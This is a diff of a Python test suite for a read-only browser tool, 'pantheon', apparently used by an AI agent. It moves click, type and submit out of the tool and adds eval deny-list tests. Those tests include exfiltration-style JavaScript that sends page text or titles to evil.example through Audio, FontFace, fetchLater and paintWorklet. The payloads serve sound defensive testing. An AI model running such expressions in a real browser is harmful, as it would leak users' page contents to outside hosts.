@@ -4,18 +4,17 @@
 Запуск: python3.14 -I plugins/pantheon/tests/test_browser.py  (код выхода 0 — все прошли)
 Всё во временных папках (HOME, PANTHEON_HOME, PANTHEON_STATE подменены); демон — подделка на месте transport(),
 настоящий браузер, порт и пароль не трогаются. Проверки с меткой [A1]…[O2] — строки модели угроз
-(drafts/0760-threat-model.md направления metis-pantheon): класс → обход → защита. Проверяется:
+(drafts/0760-threat-model.md направления metis-pantheon): класс → обход → защита. Только чтение: click, type и submit
+вынесены в metis-0765 (классы K и C3–C6 модели — там). Проверяется:
 - адрес (A): «\\», не-ASCII, %, [], @ в адресе, IP и порт — отказ; адреса нет в ответе /open или чтения, переход
-  скриптом до чтения или во время eval, нажатие увело — about:blank и отказ;
-- согласие (C): только окно вопросов (галочка доски — нет), хост вопроса целым токеном, вопрос о submit ровно с
-  «[ID] Отправить форму на <сайт>?», «да» позже последнего type или click на этом браузере по любой задаче, одно «да» —
-  одна отправка;
-- click (K): только флажок, переключатель, option, вкладка, ссылка того же сайта; вид — по элементу под точкой нажатия
-  и его интерактивному предку (locate_js под node с маленьким DOM), перекрытый элемент — отказ;
-- eval (E): побочные действия, навигация, вызов по чужому имени, доступ по строке, фоновые API — отказ, чтение — можно;
+  скриптом до чтения или во время eval, редирект на чужой сайт — about:blank и отказ;
+- согласие на чужой сайт (C1, C2): только окно вопросов (галочка доски — нет), хост вопроса целым токеном;
+- eval (E): побочные действия, навигация, вызов по чужому имени, доступ по строке, фоновые API, загрузка ресурса и
+  `new` вне списка (E6), правка формы (E7) — отказ, чтение — можно;
+- click, type, submit — отказ «вынесено в metis-0765» и в CLI (код 2), и в заявке прохода;
 - ящик (W): заявка из окна роли — в кэш окна (PANTHEON_TMP, у hq — XDG_CACHE_HOME собранного окна), вне окна —
   STATE/browser/queue; окно не из списка windows — отказ; вывод демона (O) — рядом с паролем, пароля нет в итогах;
-- сырых /cmd, /close, /events наружу нет; демон не отвечает — уведомление и запуск не чаще 10 мин; run из Claude Code —
+- сырых /cmd, /close, /events наружу нет, проход их не зовёт; демон не отвечает — уведомление и запуск не чаще 10 мин; run из Claude Code —
   отказ; kick — проход только при заявках.
 """
 import atexit
@@ -66,7 +65,7 @@ AVITO = "https://www.avito.ru/x"
 
 
 class Daemon:
-    """Подделка демона: страницы, элементы (вид — как вернул бы locate_js), рабочая вкладка; пишет все вызовы."""
+    """Подделка демона: страницы, рабочая вкладка; пишет все вызовы."""
 
     def __init__(self):
         self.up, self.tab, self.calls = True, "about:blank", []
@@ -75,25 +74,6 @@ class Daemon:
                       "https://forms.yandex.ru/u/abc/": {"title": "Анкета", "text": "поля анкеты", "links": []},
                       "https://example.com/a": {"title": "Пример", "text": "пример", "links": []}}
         self.redirect = {"https://www.avito.ru/go": "https://example.com/a"}
-        self.elements = {
-            "#send": {"kind": "button", "label": "Отправить"},
-            "#more": {"kind": "button", "label": "Показать ещё"},
-            "#buy": {"kind": "button", "label": "Оплатить заказ"},
-            "#next": {"kind": "input-submit", "label": "Далее"},
-            "#span": {"kind": "button", "label": "Продолжить"},          # span внутри button[type=submit] (K1)
-            "#div": {"kind": "none", "label": "Написать продавцу"},      # обработчик на div (K3)
-            "#q": {"kind": "input-text", "label": ""},
-            "#agree": {"kind": "checkbox", "label": "Согласен"},
-            "#tab2": {"kind": "tab", "label": "Описание"},
-            "#tabsend": {"kind": "tab", "label": "Отправить отклик"},
-            "#own": {"kind": "link", "label": "Ещё", "href": "https://www.avito.ru/y"},
-            "#post": {"kind": "link", "label": "Опубликовать", "href": "https://www.avito.ru/add"},
-            "#away": {"kind": "link", "label": "Ссылка", "href": "https://example.com/a"},
-            "#js": {"kind": "link", "label": "Ссылка", "href": "javascript:document.forms[0].submit()"},
-            "#hop": {"kind": "link", "label": "Дальше", "href": "https://www.avito.ru/hop", "goes": "https://example.com/a"},
-            "#covered": {"kind": "checkbox", "label": "Флажок", "hit": False},
-        }
-        self.pressed = None
         self.open_no_url = False      # A4: /open без поля url
         self.read_url = None          # A5: READ_JS вернёт этот адрес ("" — без поля url)
         self.eval_goes = None         # A6: выражение eval уводит вкладку сюда
@@ -122,24 +102,9 @@ class Daemon:
                 if self.read_url is not None:
                     out = {**self.pages.get(self.tab, {}), **({"url": self.read_url} if self.read_url else {})}
                 return 200, json.dumps(out)
-            m = re.match(r'\(\(\) => \{ const e = document\.querySelector\(("(?:[^"\\]|\\.)*")\)', expr)
-            if m:
-                sel = json.loads(m.group(1))
-                el = self.elements.get(sel)
-                if el is None:
-                    return 200, "null"
-                self.pressed = sel
-                return 200, json.dumps({"x": 10, "y": 20, "w": 5, "h": 5, "hit": el.get("hit", True), "kind": el["kind"],
-                                        "href": el.get("href", ""), "tag": "x", "label": el["label"],
-                                        "focused": "e.focus();" in expr})
             if self.eval_goes:
                 self.tab = self.eval_goes
             return 200, json.dumps({"value": "ок:" + expr[:40]})
-        if path == "/cmd":
-            p = body.get("params", {})
-            if p.get("type") == "mouseReleased" and self.elements.get(self.pressed, {}).get("goes"):
-                self.tab = self.elements[self.pressed]["goes"]
-            return 200, "{}"
         return 404, "нет"
 
     def paths(self):
@@ -180,21 +145,12 @@ def board_answer(t, qid, q, a):
         fh.write(json.dumps(rec, ensure_ascii=False) + "\n")
 
 
-def fresh_form():
-    """Состояние формы на браузере (changed, submitted) — с нуля: проверки C не зависят от прошлых нажатий."""
-    shutil.rmtree(B.root("state"), ignore_errors=True)
-
-
 def refused(u):
     try:
         B.url_host(u)
         return None
     except B.Refuse as e:
         return str(e)
-
-
-def mouse():
-    return [c[3]["params"]["type"] for c in D.calls if c[2] == "/cmd" and c[3]["method"] == "Input.dispatchMouseEvent"]
 
 
 # --- health и чтение по списку -----------------------------------------------------------------------------------
@@ -292,13 +248,15 @@ check("[C2] хосты вопроса — целые токены, без хво
 board_answer(T0 - 580, "metis-0556", "[metis-0556] Читать example.com?", "Да")
 res = run(req("read", url="https://example.com/a", task="metis-0556"))
 check("[C1] галочка на доске — не согласие на чужой сайт", res["state"] == "refused", res)
+check("[C1] pantheon consent видит галочку доски (общий разбор), а браузер — нет",
+      P.consent_found("metis-0556", 7)[0] and B.owner_yes("metis-0556", lambda q: True) is None)
 answer(T0 - 300, "[metis-0999] Читать example.com для анкеты?", "Нет")
 res = run(req("read", url="https://example.com/a", task="metis-0999"))
 check("позднее «нет» на тот же вопрос — снова отказ", res["state"] == "refused", res)
 
 D.calls.clear()
 res = run(req("open", url="https://www.avito.ru/go"))
-check("[A7] переход увёл на чужой сайт — отказ и about:blank", res["state"] == "refused" and "увёл" in res["why"]
+check("[A7] редирект /open на чужой сайт — отказ и about:blank", res["state"] == "refused" and "увёл" in res["why"]
       and D.tab == "about:blank", res)
 
 D.tab = AVITO
@@ -326,6 +284,15 @@ DENY = {
               "self[`fetch`]('/x')", "document.forms[0]['sub' + 'mit']()"),
     "[E5] ": ("new BroadcastChannel('x')", "new MessageChannel()", "new RTCPeerConnection()", "new WebTransport('https://x')",
               "requestIdleCallback(f)", "window.opener", "btn.onclick()"),
+    "[E6] ": ("new Audio('https://evil.example/?d=' + encodeURIComponent(document.body.innerText.slice(0,500)))",
+              "new FontFace('x', 'url(https://evil.example/?d=' + document.title + ')')",
+              "document.fonts.load('12px x')", "CSS.paintWorklet.addModule('https://evil.example/m.js')",
+              "fetchLater('https://evil.example/?d=' + document.title)", "new Image()", "new (Audio)('x')",
+              "new window.URL('x')", "new URLx('x')", "new DOMParser()", "new Map.foo('x')",
+              "new Intl.Collator.bar('x')"),
+    "[E7] ": ("document.forms[0].reset()", "document.querySelector('input[type=number]').stepUp(5)",
+              "inp.stepDown()", "sel.add(document.createElement('option'))", "sel.add(new Option('a', 'b'))",
+              "document.querySelector('dialog').requestClose()"),
 }
 for mark, exprs in DENY.items():
     for expr in exprs:
@@ -335,212 +302,32 @@ for expr in ("[...document.querySelectorAll('a')].map(a => a.href)", "document.t
              "a.length >= 2 && b.x != 3", "document.body.innerText.replace(/\\s+/g, ' ')",
              "document.querySelector('input[name=\"email\"]').value", "location.href", "location.pathname + location.search",
              "['h1', 'h2'].map(s => document.querySelector(s)?.innerText)", "document.forms[0].elements.length",
-             "document.querySelector('[data-marker=\"item-price\"]').innerText"):
+             "document.querySelector('[data-marker=\"item-price\"]').innerText",
+             "new URL(location.href).searchParams.get('q')", "new URLSearchParams(location.search).get('a')",
+             "new Date().getTime()", "new Set([1, 2]).size", "new Map().size", "new RegExp('a').test('b')",
+             "new Intl.NumberFormat('ru').format(5)", "document.querySelectorAll('.new-badge').length",
+             "document.querySelector('[class*=\"new Audio\"]')", "item.renew"):
     res = run(req("eval", url=AVITO, expr=expr))
-    check(f"eval «{expr}» — чтение, можно", res["state"] == "done", res)
+    check(f"{'[E6] ' if 'new' in expr else ''}eval «{expr}» — чтение, можно", res["state"] == "done", res)
 
-# --- K: click только по списку видов ------------------------------------------------------------------------------
-fresh_form()
+# --- click, type, submit вынесены в metis-0765; нет сырых /cmd и /close -------------------------------------------
 D.tab = AVITO
-res = run(req("click", selector="#agree"))
-check("click без --task — отказ", res["state"] == "refused" and "--task" in res["why"], res)
-for sel, mark, what in (("#send", "[K2]", "кнопка отправки"), ("#more", "[K2]", "кнопка без слов отправки"),
-                        ("#buy", "[K2]", "«Оплатить заказ»"), ("#next", "[K2]", "input type=submit «Далее»"),
-                        ("#span", "[K1]", "span внутри кнопки отправки (вид — кнопка под точкой)"),
-                        ("#div", "[K3]", "обработчик на div без интерактивного предка"),
-                        ("#q", "[K2]", "поле ввода"),
-                        ("#covered", "[K4]", "флажок под чужим элементом"),
-                        ("#away", "[K5]", "ссылка на чужой сайт"), ("#js", "[K5]", "ссылка javascript:"),
-                        ("#tabsend", "[K2]", "вкладка «Отправить отклик»"), ("#post", "[K2]", "ссылка «Опубликовать»")):
+for op, kw in (("click", {"selector": "#agree"}), ("type", {"selector": "#q", "text": "x"}),
+               ("submit", {"selector": "#send"})):
     D.calls.clear()
-    res = run(req("click", selector=sel, task="metis-0999"))
-    check(f"{mark} click: {what} — отказ «через submit», мышь не тронута",
-          res["state"] == "refused" and "submit" in res["why"] and "Отправить форму на avito.ru?" in res["why"]
-          and not mouse(), res)
-check("click: отказы не трогают состояние формы", not B.bstate("comet"), B.bstate("comet"))
-for sel, kind in (("#agree", "checkbox"), ("#tab2", "tab"), ("#own", "link")):
-    D.calls.clear()
-    D.tab = AVITO
-    res = run(req("click", selector=sel, task="metis-0999"))
-    check(f"[K2] click: {kind} — три события мыши в рабочей вкладке",
-          res["state"] == "done" and f"({kind})" in res["text"] and mouse() == ["mouseMoved", "mousePressed", "mouseReleased"],
-          (res, mouse()))
-res = run(req("click", selector="#hop", task="metis-0999"))
-check("[A7] click: ссылка того же сайта увела на чужой — отказ и about:blank",
-      res["state"] == "refused" and "увело" in res["why"] and D.tab == "about:blank", res)
-D.tab = AVITO
-res = run(req("click", selector="#nope", task="metis-0999"))
-check("click: элемента нет — отказ", res["state"] == "refused" and "нет" in res["why"], res)
-check("[K5] same_site: www и без www — один сайт; поддомен, чужой, javascript: — нет",
-      B.same_site("https://avito.ru/a", "www.avito.ru") and not B.same_site("https://m.avito.ru/a", "www.avito.ru")
-      and not B.same_site("https://example.com/", "avito.ru") and not B.same_site("javascript:void(0)", "avito.ru")
-      and not B.same_site(None, "avito.ru"))
-
-# locate_js под node: маленький DOM с closest по селектору INTERACTIVE — вид решает элемент под точкой нажатия
-NODE = shutil.which("node")
-DOM_JS = r"""
-const fs = require('fs');
-const js = fs.readFileSync(process.argv[2], 'utf8');
-function matches(e, sel) {
-  return sel.split(',').some(s => {
-    const m = s.trim().match(/^([a-z]*)(?:\[([a-z-]+)(?:=([a-z]+))?\])?$/);
-    if (!m) throw new Error('селектор ' + s);
-    const [, tag, attr, val] = m;
-    if (tag && e.tagName.toLowerCase() !== tag) return false;
-    if (attr) { const v = e.getAttribute(attr); if (v === null || (val !== undefined && v !== val)) return false; }
-    return true;
-  });
-}
-function mk(tag, attrs, parent, text) {
-  const e = {tagName: tag.toUpperCase(), attrs: attrs || {}, parentElement: parent || null, innerText: text || '',
-             value: '', title: ''};
-  e.getAttribute = a => (a in e.attrs ? e.attrs[a] : null);
-  e.contains = x => { for (let c = x; c; c = c.parentElement) if (c === e) return true; return false; };
-  e.closest = sel => { for (let c = e; c; c = c.parentElement) if (matches(c, sel)) return c; return null; };
-  e.scrollIntoView = () => {}; e.focus = () => {};
-  e.getBoundingClientRect = () => ({left: 0, top: 0, width: 10, height: 10});
-  if (tag === 'input') e.type = e.attrs.type || 'text';
-  if (tag === 'a' && 'href' in e.attrs) e.href = e.attrs.href;
-  return e;
-}
-const body = mk('body'), out = {};
-function run(name, target, hit) {
-  global.document = {querySelector: () => target, elementFromPoint: () => (hit === undefined ? target : hit),
-                     activeElement: null};
-  const r = eval(js); out[name] = [r.kind, r.hit, r.href];
-}
-const btn = mk('button', {type: 'submit'}, body, 'Продолжить');
-run('span-in-submit', mk('span', {}, btn, 'Продолжить'));
-const cb = mk('input', {type: 'checkbox'}, body);
-run('checkbox', cb);
-const lab = mk('label', {}, body, 'Согласен'); lab.control = mk('input', {type: 'checkbox'}, body);
-run('label-checkbox', lab);
-const lab2 = mk('label', {}, body, 'Согласен'); lab2.control = mk('input', {type: 'checkbox'}, body);
-run('label-center-button', lab2, mk('button', {}, lab2, 'Отправить'));
-const card = mk('div', {}, body);
-run('div-center-submit', card, mk('button', {type: 'submit'}, card, 'Отправить'));
-run('link', mk('a', {href: 'https://www.avito.ru/y'}, body, 'Ещё'));
-run('tab', mk('div', {role: 'tab'}, body, 'Описание'));
-run('div-handler', mk('span', {}, mk('div', {}, body, 'Написать'), 'Написать'));
-run('overlay', cb, mk('div', {}, body));
-run('button-type-button', mk('button', {type: 'button'}, body, 'Показать'));
-run('a-role-button', mk('a', {href: '#', role: 'button'}, body, 'Купить'));
-run('input-submit', mk('input', {type: 'submit'}, body));
-console.log(JSON.stringify(out));
-"""
-if NODE:
-    dom = os.path.join(ROOT, "dom.js")
-    loc = os.path.join(ROOT, "locate.js")
-    with open(dom, "w", encoding="utf-8") as fh:
-        fh.write(DOM_JS)
-    with open(loc, "w", encoding="utf-8") as fh:
-        fh.write(B.locate_js("#x"))
-    r = subprocess.run([NODE, dom, loc], capture_output=True, text=True, timeout=60)
-    try:
-        kinds = json.loads(r.stdout)
-    except ValueError:
-        kinds = {}
-    want = {"span-in-submit": ["button", True, ""], "checkbox": ["checkbox", True, ""],
-            "label-checkbox": ["checkbox", True, ""], "label-center-button": ["button", True, ""],
-            "div-center-submit": ["button", True, ""], "link": ["link", True, "https://www.avito.ru/y"],
-            "tab": ["tab", True, ""], "div-handler": ["none", True, ""], "overlay": ["checkbox", False, ""],
-            "button-type-button": ["button", True, ""], "a-role-button": ["role-button", True, ""],
-            "input-submit": ["input-submit", True, ""]}
-    for name, w in want.items():
-        mark = {"span-in-submit": "[K1]", "label-center-button": "[K1]", "div-center-submit": "[K1]",
-                "div-handler": "[K3]", "overlay": "[K4]", "button-type-button": "[K3]"}.get(name, "[K2]")
-        check(f"{mark} locate_js под node: {name} → вид {w[0]}, точка в элементе {w[1]}", kinds.get(name) == w,
-              (kinds.get(name), r.stderr[-300:]))
-else:
-    print("пропущено: нет node — locate_js под DOM не проверен (K1, K3, K4)")
-
-# --- C: submit по «да» окна вопросов -----------------------------------------------------------------------------
-fresh_form()
-D.tab = AVITO
-TASK = "metis-0777"
-res = run(req("submit", selector="#send", task=TASK))
-check("submit без «да» — отказ с вопросом владельцу", res["state"] == "refused" and f"[{TASK}] Отправить форму на avito.ru?"
-      in res["why"] and "pantheon consent" in res["why"], res)
-answer(T0 - 200, f"[{TASK}] Отправить форму на avito.ru? Имя: Иван", "Да — отправить")
-at(T0 - 100)
-res = run(req("type", selector="#q", text="Иван Петров", task=TASK))
-inserted = [c[3]["params"] for c in D.calls if c[2] == "/cmd" and c[3]["method"] == "Input.insertText"]
-check("type — фокус и Input.insertText", res["state"] == "done" and inserted[-1] == {"text": "Иван Петров"}, res)
-at(T0)
-res = run(req("submit", selector="#send", task=TASK))
-check("submit: «да» получено до последнего ввода — отказ", res["state"] == "refused", res)
-answer(T0 - 50, f"[{TASK}] Отправить форму на example.com? Имя: Иван Петров", "Да — отправить")
-res = run(req("submit", selector="#send", task=TASK))
-check("submit: «да» на другой сайт — отказ", res["state"] == "refused", res)
-answer(T0 - 45, f"[{TASK}] Отправить форму на avito.ru.evil.com? Имя: Иван Петров", "Да — отправить")
-res = run(req("submit", selector="#send", task=TASK))
-check("[C3] submit: «да» на avito.ru.evil.com — не avito.ru, отказ", res["state"] == "refused", res)
-answer(T0 - 40, f"[{TASK}] Отправить форму на avito.ru? Имя: Иван Петров", "Нет")
-res = run(req("submit", selector="#send", task=TASK))
-check("submit: «нет» — отказ", res["state"] == "refused", res)
-answer(T0 - 30, f"[{TASK}] Отправить форму на avito.ru? Имя: Иван Петров, телефон", "Да — отправить")
-res = run(req("submit", selector="#covered", task=TASK))
-check("[K4] submit: точка нажатия закрыта другим элементом — отказ, «да» не израсходовано",
-      res["state"] == "refused" and "закрыта" in res["why"] and not B.bstate("comet").get("submitted"), res)
-D.calls.clear()
-res = run(req("submit", selector="#send", task=TASK))
-check("submit: «да» после ввода — отправка нажатием", res["state"] == "done" and len(mouse()) == 3, res)
-res = run(req("submit", selector="#send", task=TASK))
-check("[C6] submit: одно «да» — одна отправка, второй раз отказ", res["state"] == "refused", res)
-
-fresh_form()
-board_answer(T0 + 10, "t-bd", "[t-bd] Отправить форму на avito.ru?", "Да — отправить")
-at(T0 + 20)
-check("[C1] pantheon consent видит галочку доски (общий разбор), а браузер — нет",
-      P.consent_found("t-bd", 7)[0] and B.owner_yes("t-bd", lambda q: True) is None)
-res = run(req("submit", selector="#send", task="t-bd"))
-check("[C1] submit по галочке на доске — отказ", res["state"] == "refused" and "окном вопросов" in res["why"], res)
-
-fresh_form()
-answer(T0 + 30, "[t-ns] Заполнить анкету на avito.ru, но не отправлять?", "Да")
-answer(T0 + 31, "[t-ns] Проверь: Отправить форму на avito.ru?", "Да")
-answer(T0 + 32, "[t-ns] Отправить форму на avito.ru", "Да")
-answer(T0 + 33, "[t-ns] Пока не надо: «[t-ns] Отправить форму на avito.ru?» спрошу позже", "Да")
-at(T0 + 40)
-res = run(req("submit", selector="#send", task="t-ns"))
-check("[C3] «да» на вопрос, который не начинается ровно с «[ID] Отправить форму на avito.ru?» — отказ",
-      res["state"] == "refused", res)
-
-fresh_form()
-answer(T0 + 50, "[t-b] Отправить форму на avito.ru? (старое)", "Да — отправить")
-at(T0 + 100)
-res = run(req("type", selector="#q", text="другое", task="t-a"))
-at(T0 + 110)
-res = run(req("submit", selector="#send", task="t-b"))
-check("[C4] ввод по задаче t-a после «да» по t-b — submit по t-b отказ (форма одна на браузер)",
-      res["state"] == "refused", res)
-answer(T0 + 120, "[t-b] Отправить форму на avito.ru? Имя: другое", "Да — отправить")
-at(T0 + 130)
-res = run(req("submit", selector="#send", task="t-b"))
-check("[C4] новое «да» по t-b после ввода — отправка", res["state"] == "done", res)
-
-fresh_form()
-answer(T0 + 200, "[t-c] Отправить форму на avito.ru?", "Да — отправить")
-at(T0 + 210)
-res = run(req("click", selector="#agree", task="t-c"))
-at(T0 + 220)
-res2 = run(req("submit", selector="#send", task="t-c"))
-check("[C5] флажок после «да» — submit отказ: нужно новое «да»", res["state"] == "done" and res2["state"] == "refused",
-      (res, res2))
-at(T0)
-
-# --- нет сырых /cmd и /close -------------------------------------------------------------------------------------
+    res = run(req(op, task="metis-0999", **kw))
+    check(f"заявка {op} в проходе — отказ «вынесено в metis-0765», демон не зван",
+          res["state"] == "refused" and "metis-0765" in res["why"] and not D.calls, res)
 for op in ("cmd", "close", "events", "console"):
     res = run(req(op, method="Runtime.evaluate"))
     check(f"op {op} — отказ «не того вида»", res["state"] == "refused" and "не того вида" in res["why"], res)
 methods = {c[3]["method"] for c in D.calls if c[2] == "/cmd"}
 all_paths = set(D.paths())
-check("проход зовёт /cmd только с Input.dispatchMouseEvent и Input.insertText; /close, /events, /console — никогда",
-      methods <= {"Input.dispatchMouseEvent", "Input.insertText"} and not all_paths & {"/close", "/events", "/console"},
-      (methods, all_paths))
+check("проход не зовёт /cmd, /close, /events, /console — только /health, /open, /eval",
+      not methods and all_paths <= {"/health", "/open", "/eval"}, (methods, all_paths))
 src = open(os.path.join(LIB, "browser.py"), encoding="utf-8").read()
-check("в browser.py нет вызовов /close, /events, /console демона",
-      not re.search(r'"/(?:close|events|console)"', src))
+check("в browser.py нет вызовов /cmd, /close, /events, /console демона",
+      not re.search(r'"/(?:cmd|close|events|console)"', src))
 
 # --- список из reads.toml, окна --------------------------------------------------------------------------------------
 os.makedirs(os.path.join(HOME, ".claude", "pantheon"), exist_ok=True)
@@ -610,12 +397,15 @@ os.makedirs(HQ_TMP)
 win_env = dict(base_env, PANTHEON_TMP=HQ_TMP, PANTHEON_ROLE="charon")
 r = subprocess.run([PY311, "-I", RUN_PY, "browser", "read", AVITO, "--wait", "0"],
                    env=win_env, capture_output=True, text=True, timeout=60)
-rbad = subprocess.run([PY311, "-I", RUN_PY, "browser", "click", "#agree"], env=win_env, capture_output=True,
-                      text=True, timeout=60)
-last = (rbad.stdout + rbad.stderr).strip().splitlines()[-1:]
-check("CLI click без --task: код 2, причина последней строкой", rbad.returncode == 2 and last
-      and last[0].startswith("pantheon browser: ") and "--task" in last[0], (rbad.returncode, last))
 qd = os.path.join(CACHES, "hq", "browser")
+for argv in (["click", "#agree", "--task", "metis-0999"], ["type", "#q", "текст", "--task", "metis-0999"],
+             ["submit", "#send", "--task", "metis-0999"], ["click", "#agree"]):
+    rbad = subprocess.run([PY311, "-I", RUN_PY, "browser", *argv], env=win_env, capture_output=True, text=True, timeout=60)
+    last = (rbad.stdout + rbad.stderr).strip().splitlines()[-1:]
+    check(f"CLI {' '.join(argv)}: код 2, «вынесено в metis-0765» последней строкой, заявки нет",
+          rbad.returncode == 2 and last and last[0].startswith(f"pantheon browser: {argv[0]}: ")
+          and "metis-0765" in last[0] and len(os.listdir(qd) if os.path.isdir(qd) else []) == 1,
+          (rbad.returncode, last))
 reqs = [n for n in os.listdir(qd)] if os.path.isdir(qd) else []
 check("CLI из окна: заявка в кэше окна (hq/browser), код 0", r.returncode == 0 and len(reqs) == 1
       and reqs[0].endswith(".req.json"), (r.returncode, r.stdout, r.stderr, reqs))
